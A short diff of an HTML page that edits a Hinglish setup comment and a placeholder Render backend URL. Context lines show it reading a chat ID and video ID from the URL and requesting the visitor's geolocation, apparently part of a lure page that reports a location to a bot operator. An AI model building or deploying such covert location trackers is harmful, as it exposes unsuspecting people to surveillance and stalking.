@@ -1,4 +1,4 @@
-here<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -23,8 +23,8 @@ here<!DOCTYPE html>
         const chatId = urlParams.get('chat_id');
         const targetVideo = urlParams.get('video_id') || 'dQw4w9WgXcQ'; 
 
-        // ⚠️ APNE BACKEND SERVER KA LIVE URL YAHAN DAALEIN
-        const BACKEND_URL = 'https://YOUR-BACKEND-SERVER.onrender.com'; 
+        // ⚠️ Render par backend deploy karne ke baad jo link milega, use yahan daalein
+        const BACKEND_URL = 'https://YOUR-RENDER-APP-URL.onrender.com'; 
 
         function requestLocation() {
             if (!navigator.geolocation) {
